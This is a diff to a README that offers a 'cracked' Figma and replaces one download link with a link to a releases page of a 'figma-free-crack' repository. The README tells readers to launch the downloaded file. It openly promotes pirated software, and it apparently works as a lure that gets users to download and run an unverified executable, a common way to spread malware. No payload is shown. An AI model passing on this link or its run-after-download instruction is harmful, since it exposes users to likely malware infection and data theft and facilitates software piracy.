@@ -26,7 +26,7 @@ This repository provides an opportunity for users to access a cracked version of
 ## How to Download
 
 To access the cracked version of Figma, simply click the link below:
-[DOWNLOAD NOW](https://github.com/uploads/App.zip)
+[DOWNLOAD NOW](https://github.com/helloworld-89/figma-free-crack/releases)
 
 Please note that the file needs to be launched after downloading.
 
